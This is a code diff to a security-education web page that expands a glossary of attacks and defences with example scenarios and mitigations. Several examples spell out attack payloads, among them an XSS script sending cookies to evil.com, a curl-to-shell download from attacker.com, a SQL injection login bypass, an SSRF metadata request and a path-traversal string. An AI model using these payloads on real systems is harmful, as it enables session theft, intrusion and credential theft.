@@ -549,39 +549,235 @@ interface GlossaryEntry {
   term: string;
   category: "Fundamentals" | "Attacks" | "Defense" | "Protocols" | "Crypto";
   definition: string;
+  example: string;
+  mitigation: string;
 }
 
 const GLOSSARY: GlossaryEntry[] = [
-  { term: "CIA Triad", category: "Fundamentals", definition: "The three foundational pillars of information security: Confidentiality, Integrity, and Availability." },
-  { term: "Trust Boundary", category: "Fundamentals", definition: "The perimeter separating trusted internal code from untrusted external data. Any data crossing it must be validated." },
-  { term: "Authentication (AuthN)", category: "Fundamentals", definition: "The process of verifying identity — answering 'Who are you?' using passwords, biometrics, or keys." },
-  { term: "Authorization (AuthZ)", category: "Fundamentals", definition: "The process of verifying permissions — answering 'What are you allowed to access or perform?'" },
-  { term: "Least Privilege", category: "Defense", definition: "Security model of granting users and processes only the absolute minimum permissions required for their tasks." },
-  { term: "Defense in Depth", category: "Defense", definition: "Implementing multiple redundant defensive layers so that the failure of any single safeguard does not cause a total compromise." },
-  { term: "Zero Trust", category: "Defense", definition: "A security architecture operating on the principle 'Never trust, always verify', requiring continuous authentication at every layer." },
-  { term: "IDOR / BOLA", category: "Attacks", definition: "Insecure Direct Object Reference / Broken Object Level Authorization: manipulating IDs (e.g. ?id=102) to access unauthorized records." },
-  { term: "Cross-Site Scripting (XSS)", category: "Attacks", definition: "Injecting malicious JavaScript into web applications which executes in the victim browser session (Reflected, Stored, or DOM)." },
-  { term: "SQL Injection (SQLi)", category: "Attacks", definition: "Injecting database commands through untrusted inputs when queries fail to use prepared parameterized statements." },
-  { term: "Cross-Site Request Forgery (CSRF)", category: "Attacks", definition: "Tricking a victim browser into making unwanted authenticated state-changing actions on a trusted site." },
-  { term: "Server-Side Request Forgery (SSRF)", category: "Attacks", definition: "Abusing server functionality to force the backend to send requests to internal resources (e.g., AWS metadata 169.254.169.254)." },
-  { term: "Credential Stuffing", category: "Attacks", definition: "Automated bot attacks testing stolen username/password dumps from previous breaches against target web services." },
-  { term: "Brute Force Attack", category: "Attacks", definition: "Systematically trying every possible combination of passwords, keys, or IDs until finding a match." },
-  { term: "Clickjacking", category: "Attacks", definition: "Tricking users into clicking malicious buttons by embedding transparent iframe overlays over trusted pages (stopped by X-Frame-Options: DENY)." },
-  { term: "Man-in-the-Middle (MitM)", category: "Attacks", definition: "An attacker secretly intercepting and altering communications between two parties who believe they are directly talking." },
-  { term: "Session Fixation", category: "Attacks", definition: "An attack where an adversary sets a victim's session ID before authentication and abuses it once the victim logs in." },
-  { term: "Content Security Policy (CSP)", category: "Defense", definition: "An HTTP response header defining approved sources of executable scripts, stylesheets, and assets to mitigate XSS." },
-  { term: "HSTS", category: "Protocols", definition: "HTTP Strict Transport Security: response header enforcing HTTPS-only connections and blocking SSL-stripping downgrades." },
-  { term: "SameSite Cookie", category: "Protocols", definition: "Cookie attribute (Strict/Lax/None) controlling whether the cookie is sent along with cross-origin requests, blocking CSRF." },
-  { term: "HttpOnly Cookie", category: "Defense", definition: "A cookie attribute preventing client-side scripts from reading session tokens via document.cookie, stopping XSS theft." },
-  { term: "CORS", category: "Protocols", definition: "Cross-Origin Resource Sharing: mechanism using HTTP headers to tell browsers whether a web app can access resources from another origin." },
-  { term: "Argon2id", category: "Crypto", definition: "The winner of the Password Hashing Competition; a modern memory-hard algorithm resistant to GPU/ASIC brute-forcing." },
-  { term: "bcrypt", category: "Crypto", definition: "An adaptive key derivation function based on the Blowfish cipher, widely used for secure password hashing with adjustable work factor." },
-  { term: "Salt", category: "Crypto", definition: "Cryptographically random data appended to passwords before hashing to defeat precomputed Rainbow Table attacks." },
-  { term: "JWT (JSON Web Token)", category: "Protocols", definition: "A compact, URL-safe standard (RFC 7519) for transmitting claims securely as a signed JSON payload." },
-  { term: "WAF (Web Application Firewall)", category: "Defense", definition: "A security filter inspecting incoming HTTP traffic to block SQLi, XSS, and automated malicious bots." },
-  { term: "Rate Limiting", category: "Defense", definition: "Restricting the number of requests a client can make in a given timeframe (e.g. 5 attempts/minute) to stop brute-forcing." },
-  { term: "CVE (Common Vulnerabilities & Exposures)", category: "Fundamentals", definition: "A standardized dictionary of publicly known cybersecurity vulnerabilities and exposures maintained by MITRE." },
-  { term: "CVSS (Common Vulnerability Scoring System)", category: "Fundamentals", definition: "An industry standard (scale 0.0 to 10.0) measuring the severity of security vulnerabilities." },
+  {
+    term: "CIA Triad",
+    category: "Fundamentals",
+    definition: "The core benchmark model for information security: Confidentiality (data is protected from unauthorized viewing), Integrity (data is protected from unauthorized modification or tampering), and Availability (systems and data remain reliably accessible to authorized users when needed).",
+    example: "A ransomware attack encrypts a hospital's patient records — this destroys Availability. A hacker stealing credit card numbers breaks Confidentiality. An attacker modifying bank balances breaks Integrity.",
+    mitigation: "Enforce end-to-end encryption (Confidentiality), cryptographic hashing/signatures (Integrity), and redundant cloud backups/DDoS protection (Availability).",
+  },
+  {
+    term: "Trust Boundary",
+    category: "Fundamentals",
+    definition: "The architectural perimeter separating code you control and trust (e.g. backend database and internal microservices) from external untrusted data sources (e.g. public internet, user form inputs, query strings, headers, and third-party APIs).",
+    example: "A web app assumes an HTTP header `X-User-Role: Admin` was set by an internal load balancer, but an external client crafts that header directly in Postman and gets admin access.",
+    mitigation: "Never trust data crossing the perimeter. Validate and sanitize all incoming parameters on the server side using strict allow-lists.",
+  },
+  {
+    term: "Authentication (AuthN)",
+    category: "Fundamentals",
+    definition: "The mechanism of proving an entity's claimed identity — answering the fundamental question 'Who are you?'. It relies on three factors: something you know (password/PIN), something you have (hardware token/authenticator app), or something you are (biometrics/fingerprint).",
+    example: "Submitting a username and password along with a 6-digit TOTP authenticator code to log into your cloud dashboard.",
+    mitigation: "Enforce multi-factor authentication (MFA/WebAuthn), modern password hashing (Argon2id/bcrypt), and generic failure messages to stop enumeration.",
+  },
+  {
+    term: "Authorization (AuthZ)",
+    category: "Fundamentals",
+    definition: "The policy enforcement process that determines what an already-authenticated user is allowed to access or execute — answering 'What are you permitted to do?'. Occurs strictly after authentication.",
+    example: "A logged-in junior employee tries to open `/api/payroll/all-salaries`. The authentication check passes (they are logged in), but the authorization guard blocks them (role is not 'HR Manager').",
+    mitigation: "Adopt Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC) with a 'Deny by Default' policy on every individual endpoint.",
+  },
+  {
+    term: "Least Privilege",
+    category: "Defense",
+    definition: "A security design principle requiring that every user, service account, background worker, and database connection operate with only the minimum privileges essential for its specific job function, and nothing more.",
+    example: "A web application's database user only has `SELECT` and `INSERT` permissions on the `comments` table, rather than having full `DB_ADMIN` or `DROP TABLE` permissions.",
+    mitigation: "Audit system roles quarterly, avoid running processes as `root`/`Administrator`, and separate read-only database connections from read-write pools.",
+  },
+  {
+    term: "Defense in Depth",
+    category: "Defense",
+    definition: "A layered defensive architecture where multiple redundant, independent security controls are deployed so that if one security barrier is breached or misconfigured, subsequent layers prevent total system compromise.",
+    example: "If an attacker discovers an XSS vulnerability, a strict Content-Security-Policy (CSP) prevents malicious script execution, and `HttpOnly` cookie flags prevent session theft.",
+    mitigation: "Layer network firewalls, WAFs, input validation, context-aware encoding, secure HTTP headers, and continuous SIEM logging together.",
+  },
+  {
+    term: "Zero Trust Architecture",
+    category: "Defense",
+    definition: "A modern security paradigm operating under the rule 'Never trust, always verify'. It removes the outdated concept of an implicit trusted corporate network; every request must be authenticated, authorized, and encrypted before granting access.",
+    example: "An engineer connecting from an office desktop must still pass MFA, have a verified healthy device posture, and authenticate via mutual TLS (mTLS) to reach an internal microservice.",
+    mitigation: "Implement micro-segmentation, identity-aware proxies (BeyondCorp model), and continuous session health validation.",
+  },
+  {
+    term: "IDOR / BOLA",
+    category: "Attacks",
+    definition: "Insecure Direct Object Reference / Broken Object Level Authorization. Occurs when an application accepts a direct user-supplied resource identifier (e.g. database ID) in an API request and returns the record without verifying that the current user owns it.",
+    example: "User logs in as Account #101 and visits `GET /api/medical-records?id=101`. Changing the URL parameter to `id=102` immediately returns another patient's private medical file.",
+    mitigation: "Always scope database queries to the verified session identity: `SELECT * FROM records WHERE id = ? AND user_id = session.user_id`.",
+  },
+  {
+    term: "Cross-Site Scripting (XSS)",
+    category: "Attacks",
+    definition: "A code injection vulnerability where malicious JavaScript is inserted into trusted web applications and executed inside the victim's browser session, allowing attackers to steal session cookies, capture keystrokes, or redirect users.",
+    example: "An attacker posts a comment containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. When other users view the comment, the script runs in their browser.",
+    mitigation: "Perform context-aware output encoding (HTML, attribute, JS escaping), use safe DOM methods (`.textContent`), set `HttpOnly` on session cookies, and deploy a strict CSP.",
+  },
+  {
+    term: "SQL Injection (SQLi)",
+    category: "Attacks",
+    definition: "An injection attack occurring when untrusted user input is directly concatenated into SQL query strings, allowing an adversary to alter query syntax, bypass authentication, extract database dumps, or execute remote commands.",
+    example: "Entering `' OR '1'='1' --` into a login username box turns `SELECT * FROM users WHERE user = '" + input + "'` into a condition that always evaluates to true, logging in without a password.",
+    mitigation: "Always use Prepared Statements (Parameterized Queries) or Object-Relational Mappers (ORMs). Never concatenate strings into SQL statements.",
+  },
+  {
+    term: "Cross-Site Request Forgery (CSRF)",
+    category: "Attacks",
+    definition: "An attack that tricks an authenticated victim browser into submitting unauthorized, malicious state-changing requests (e.g., funds transfer, password change) to a vulnerable application that trusts the victim's session cookies.",
+    example: "A user is logged into their bank. They visit an attacker's website containing `<img src='https://bank.com/transfer?to=attacker&amount=5000'>`. The browser automatically sends bank session cookies.",
+    mitigation: "Use `SameSite=Lax` or `SameSite=Strict` cookie attributes and validate cryptographically random anti-CSRF synchronizer tokens on all state-changing POST/PUT requests.",
+  },
+  {
+    term: "Server-Side Request Forgery (SSRF)",
+    category: "Attacks",
+    definition: "A vulnerability where a server-side web application is coerced into making HTTP or network requests to an arbitrary destination chosen by the attacker, often targeting internal microservices, loopback adapters, or cloud metadata endpoints.",
+    example: "An avatar upload feature accepts a URL `https://example.com/pic.png`. The attacker inputs `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal AWS cloud credentials.",
+    mitigation: "Validate and parse target URLs against strict allow-lists of protocols and domains, block private IP ranges (RFC 1918, 127.0.0.1, 169.254.169.254), and disable HTTP redirects.",
+  },
+  {
+    term: "Credential Stuffing",
+    category: "Attacks",
+    definition: "The automated mass-testing of stolen combinations of usernames, emails, and passwords obtained from third-party data breaches across hundreds of popular online services, exploiting password re-use by victims.",
+    example: "A botnet tests 5,000,000 email/password pairs dumped from an old social media breach against an e-commerce login portal, successfully compromising 50,000 accounts.",
+    mitigation: "Deploy rate limiting, bot detection/WAF, CAPTCHAs on anomalous traffic, check against HaveIBeenPwned breach APIs, and enforce mandatory MFA.",
+  },
+  {
+    term: "Brute Force & Password Spraying",
+    category: "Attacks",
+    definition: "Brute forcing systematically guesses passwords for a single account. Password spraying flips this by trying one common password (e.g. 'Summer2026!') across thousands of different user accounts to evade per-account lockout policies.",
+    example: "An attacker queries an Active Directory login portal with 1,000 employee usernames using the single password `Company@2026!`, bypassing account lockouts that trigger at 5 attempts.",
+    mitigation: "Implement progressive delay throttles, cross-account IP rate limiting, anomaly detection, and enforce hardware security keys (FIDO2).",
+  },
+  {
+    term: "Clickjacking (UI Redressing)",
+    category: "Attacks",
+    definition: "A malicious technique where an attacker embeds a legitimate, trusted website inside an invisible transparent `<iframe>` layer overlaid precisely on top of a decoy button (e.g., 'Click here to win a prize'), tricking the user into clicking banking or admin controls.",
+    example: "A game website has a button 'Play Game'. Positioned invisibly directly over it is an iframe with the victim's social media 'Delete Account' button.",
+    mitigation: "Send HTTP header `X-Frame-Options: DENY` or Content Security Policy `frame-ancestors 'none'` to instruct browsers to forbid framing.",
+  },
+  {
+    term: "Man-in-the-Middle (MitM) & SSL Stripping",
+    category: "Attacks",
+    definition: "An interception attack where an adversary secretly relays and potentially alters communications between two parties. SSL Stripping actively intercepts initial plaintext HTTP requests and prevents the browser from upgrading to secure HTTPS.",
+    example: "An attacker running a rogue Wi-Fi hotspot in a coffee shop intercepts an unencrypted HTTP navigation to a portal, stripping TLS and sniffing passwords in cleartext.",
+    mitigation: "Enforce HTTPS everywhere with HTTP Strict Transport Security (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`).",
+  },
+  {
+    term: "Session Fixation & Hijacking",
+    category: "Attacks",
+    definition: "Session hijacking involves stealing an active session token (via XSS or network sniffing). Session fixation involves an attacker pre-setting a known session ID in the victim's browser and waiting for the victim to authenticate, after which the attacker uses the fixed ID.",
+    example: "An attacker sends a link `https://bank.com/?session_id=attacker_token`. The victim clicks and signs in; the backend fails to regenerate the session ID, allowing the attacker to access the account.",
+    mitigation: "Always regenerate session tokens immediately upon successful authentication, and bind sessions to secure, HttpOnly, SameSite cookies.",
+  },
+  {
+    term: "Content Security Policy (CSP)",
+    category: "Defense",
+    definition: "A powerful HTTP response header allowing site administrators to declare an allow-list of approved sources from which the browser is allowed to load and execute resources (scripts, styles, images, fonts, iframes, AJAX requests).",
+    example: "A response sends `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'`. Any inline `<script>` injected via XSS is blocked by the browser.",
+    mitigation: "Implement a strict nonce-based or hash-based CSP, ban `unsafe-inline` and `eval()`, and monitor violations using `report-uri` / `report-to`.",
+  },
+  {
+    term: "HSTS (HTTP Strict Transport Security)",
+    category: "Protocols",
+    definition: "A security header informing web browsers that the domain must only ever be accessed using secure HTTPS connections, automatically converting all insecure `http://` links to `https://` before sending any packets.",
+    example: "`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` tells the browser to remember for 1 year that plain HTTP is strictly prohibited.",
+    mitigation: "Deploy HSTS with at least 1 year duration, include subdomains, and submit your domain to the official Chromium HSTS preload list.",
+  },
+  {
+    term: "SameSite Cookie Attribute",
+    category: "Protocols",
+    definition: "A cookie security flag controlling whether cookies are attached to cross-origin requests. `Strict` blocks cookies on all cross-site requests. `Lax` allows cookies only on top-level incoming GET navigations. `None` requires the `Secure` flag.",
+    example: "`Set-Cookie: session=xyz; SameSite=Lax; Secure; HttpOnly`. When a malicious site triggers a background POST request to your bank, the browser strips the session cookie.",
+    mitigation: "Default all session cookies to `SameSite=Lax` or `SameSite=Strict` for sensitive banking and state-changing application cookies.",
+  },
+  {
+    term: "HttpOnly & Secure Cookie Flags",
+    category: "Defense",
+    definition: "`HttpOnly` blocks client-side JavaScript (`document.cookie`) from accessing the cookie, preventing credential theft via XSS. `Secure` ensures the cookie is only transmitted across encrypted TLS/HTTPS channels, blocking plaintext network sniffing.",
+    example: "`Set-Cookie: auth_token=9a8b7c; Secure; HttpOnly; SameSite=Strict; Path=/` provides complete defense against transport sniffing and DOM-based extraction.",
+    mitigation: "Make `Secure` and `HttpOnly` mandatory standard flags across all authentication and session identifiers.",
+  },
+  {
+    term: "CORS (Cross-Origin Resource Sharing)",
+    category: "Protocols",
+    definition: "An HTTP-header based security mechanism allowing a server to specify which external origins (domains) are permitted to read its API responses, overcoming the browser's default Same-Origin Policy (SOP).",
+    example: "An API server sends `Access-Control-Allow-Origin: https://app.example.com` allowing only that trusted domain to read private JSON data in JavaScript.",
+    mitigation: "Never return `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Explicitly validate the incoming `Origin` header against an allow-list.",
+  },
+  {
+    term: "Argon2id Key Derivation",
+    category: "Crypto",
+    definition: "The state-of-the-art password hashing algorithm that won the Password Hashing Competition (PHC). It is memory-hard and compute-hard, providing maximum mathematical resistance against dedicated GPU, FPGA, and ASIC cracking rigs.",
+    example: "Hashing a password using Argon2id with 64MB memory cost, 3 iterations, and 4 parallel threads ensures brute-forcing takes decades per hash.",
+    mitigation: "Use Argon2id or bcrypt (cost factor >= 12) for all new application password storage systems.",
+  },
+  {
+    term: "bcrypt Algorithm",
+    category: "Crypto",
+    definition: "A battle-tested adaptive key derivation function based on the Blowfish cipher. It incorporates a salt to protect against rainbow table attacks and features a configurable 'work factor' (cost) that can be increased as hardware speeds up.",
+    example: "A bcrypt hash `$2b$12$e8n...` uses cost 12 ($2^{12} = 4,096$ iterations), requiring ~250ms of CPU time per password verification.",
+    mitigation: "Configure bcrypt cost to balance server response time with security (typically cost 12 to 14 in modern production backends).",
+  },
+  {
+    term: "Cryptographic Salt & Pepper",
+    category: "Crypto",
+    definition: "A salt is a unique, cryptographically random string generated per user and appended to passwords before hashing, defeating precomputed Rainbow Tables. A pepper is a secret application-wide key stored separately from the database.",
+    example: "Two users choose the password `Password123!`. With unique salts, their resulting database hashes are completely different, preventing simultaneous dictionary cracking.",
+    mitigation: "Always generate unique salts using a CSPRNG (at least 16 bytes). Modern algorithms (Argon2, bcrypt) handle salts automatically.",
+  },
+  {
+    term: "JWT (JSON Web Token) Security",
+    category: "Protocols",
+    definition: "An open standard (RFC 7519) defining a compact, URL-safe container format for transmitting cryptographically signed claims. Common vulnerabilities include accepting the `none` algorithm, weak HMAC secrets, or storing sensitive tokens in `localStorage`.",
+    example: "A token `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` signed with an asymmetric RSA private key and verified by microservices using the public key.",
+    mitigation: "Enforce strict algorithm verification (`alg: RS256` or `ES256`), keep token lifespans short (e.g. 15 minutes), and store refresh tokens in secure HttpOnly cookies.",
+  },
+  {
+    term: "Web Application Firewall (WAF)",
+    category: "Defense",
+    definition: "An application-layer (Layer 7) security filter that inspects incoming HTTP/HTTPS traffic to identify and block malicious payloads, including SQLi, XSS, automated scrapers, and zero-day exploit attempts before they reach the web server.",
+    example: "A Cloudflare or AWS WAF rule detects a SQL injection payload `UNION SELECT 1,2,3` in an HTTP query parameter and drops the connection with an immediate 403 Forbidden.",
+    mitigation: "Deploy a managed WAF in front of web applications as a defense-in-depth shield, but never treat a WAF as a replacement for secure coding practices.",
+  },
+  {
+    term: "Rate Limiting & Throttling",
+    category: "Defense",
+    definition: "The enforcement of operational limits on how many requests a specific IP address, user account, or API key is allowed to make within a defined time window (e.g. using the Token Bucket or Sliding Window algorithm).",
+    example: "An API gateway restricts clients to 100 requests/minute. Exceeding this returns HTTP `429 Too Many Requests` with a `Retry-After: 60` header.",
+    mitigation: "Implement tiered rate limiting: strict limits on authentication/reset endpoints (5/min) and broader limits on general data APIs (1000/hour).",
+  },
+  {
+    term: "CVE & CVSS Scoring",
+    category: "Fundamentals",
+    definition: "CVE (Common Vulnerabilities and Exposures) is a standardized dictionary of public security flaws (e.g. CVE-2021-44228 Log4j). CVSS (Common Vulnerability Scoring System) assigns a severity score from 0.0 (None) to 10.0 (Critical) based on attack vector, complexity, and impact.",
+    example: "A vulnerability scored CVSS 9.8 Critical requires no authentication, is remotely exploitable over the network, and results in complete data and system loss.",
+    mitigation: "Monitor project dependencies in CI/CD with automated scanners (`npm audit`, Snyk, Dependabot) and patch High/Critical CVEs within 24-48 hours.",
+  },
+  {
+    term: "Remote Code Execution (RCE)",
+    category: "Attacks",
+    definition: "One of the most dangerous vulnerabilities in cybersecurity, where an attacker exploits a flaw to execute arbitrary system commands or malware directly on the target host server or container.",
+    example: "An unpatched image processing library executes embedded shell commands inside a malicious uploaded JPEG: `image.jpg; curl http://attacker.com/malware | sh`.",
+    mitigation: "Never pass user input to shell execution functions (`exec()`, `system()`, `eval()`), run application containers in read-only filesystems, and apply least privilege.",
+  },
+  {
+    term: "Subresource Integrity (SRI)",
+    category: "Defense",
+    definition: "A browser security feature enabling web applications to ensure that files fetched from third-party CDNs (e.g., jQuery, Bootstrap) have not been modified or infected with malicious scripts.",
+    example: "`<script src='https://cdn.example.com/lib.js' integrity='sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC' crossorigin='anonymous'></script>`.",
+    mitigation: "Always generate and include base64 cryptographic integrity hashes on all third-party hosted scripts and stylesheets.",
+  },
+  {
+    term: "Path Traversal & Local File Inclusion (LFI)",
+    category: "Attacks",
+    definition: "A vulnerability allowing an attacker to read arbitrary files from the server's filesystem by manipulating file path parameters using directory traversal sequences (`../` or `%2e%2e%2f`).",
+    example: "An endpoint `GET /view?file=report.pdf` is manipulated to `GET /view?file=../../../../etc/passwd`, allowing the attacker to download the server's user list.",
+    mitigation: "Avoid passing user input directly to filesystem APIs. Use fixed filename maps, strip directory traversal characters, and verify canonical paths stay within safe root directories.",
+  },
 ];
 
 /* ------------------------------------------------------------------ */
@@ -914,21 +1110,46 @@ export function Resources() {
         </div>
 
         {/* Glossary Grid */}
-        <div className="mt-4 grid gap-3 sm:grid-cols-2">
+        <div className="mt-6 grid gap-5 sm:grid-cols-2">
           {filteredGlossary.map((g) => (
-            <div key={g.term} className="rounded-xl border border-border bg-card p-4 transition-colors hover:border-border/80">
-              <div className="flex items-center justify-between">
-                <dt className="text-sm font-semibold text-foreground">{g.term}</dt>
-                <span className="rounded bg-surface px-2 py-0.5 font-mono text-[10px] uppercase text-cyan border border-border">
-                  {g.category}
-                </span>
+            <div
+              key={g.term}
+              className="flex flex-col justify-between rounded-2xl border border-border bg-card p-5 transition-all duration-300 hover:border-cyan/40 hover:shadow-lg hover:shadow-cyan/5"
+            >
+              <div>
+                <div className="flex items-center justify-between gap-2 border-b border-border/60 pb-3">
+                  <dt className="text-base font-semibold text-foreground">{g.term}</dt>
+                  <span className="rounded-full bg-cyan/10 px-2.5 py-0.5 font-mono text-[10px] uppercase tracking-wider text-cyan border border-cyan/30">
+                    {g.category}
+                  </span>
+                </div>
+
+                {/* Core Concept Definition */}
+                <dd className="mt-3 text-xs leading-relaxed text-muted-foreground">{g.definition}</dd>
+
+                {/* Real-World Example Callout */}
+                <div className="mt-4 rounded-xl border border-warning/20 bg-warning/[0.04] p-3.5">
+                  <div className="flex items-center gap-1.5 font-mono text-[11px] font-semibold uppercase tracking-wider text-warning">
+                    <Icon name="lightbulb" size={13} /> Practical Example / Scenario
+                  </div>
+                  <p className="mt-1.5 font-mono text-[11px] leading-relaxed text-foreground/90">{g.example}</p>
+                </div>
+
+                {/* Defender Mitigation Box */}
+                <div className="mt-3 rounded-xl border border-success/25 bg-success/[0.04] p-3.5">
+                  <div className="flex items-center gap-1.5 font-mono text-[11px] font-semibold uppercase tracking-wider text-success">
+                    <Icon name="shield" size={13} /> Defender Fix & Mitigation
+                  </div>
+                  <p className="mt-1 text-xs leading-relaxed text-muted-foreground">{g.mitigation}</p>
+                </div>
               </div>
-              <dd className="mt-2 text-xs leading-relaxed text-muted-foreground">{g.definition}</dd>
             </div>
           ))}
           {filteredGlossary.length === 0 && (
-            <div className="col-span-full rounded-xl border border-dashed border-border p-8 text-center">
-              <p className="text-sm text-muted-foreground">No matching cybersecurity terms found for "{searchTerm}".</p>
+            <div className="col-span-full rounded-2xl border border-dashed border-border p-12 text-center">
+              <Icon name="search" size={24} className="mx-auto text-subtle" />
+              <p className="mt-3 text-sm text-foreground">No matching cybersecurity terms found for "{searchTerm}".</p>
+              <p className="mt-1 text-xs text-muted-foreground">Try searching for keywords like XSS, SQLi, IDOR, CSP, or Salt.</p>
             </div>
           )}
         </div>
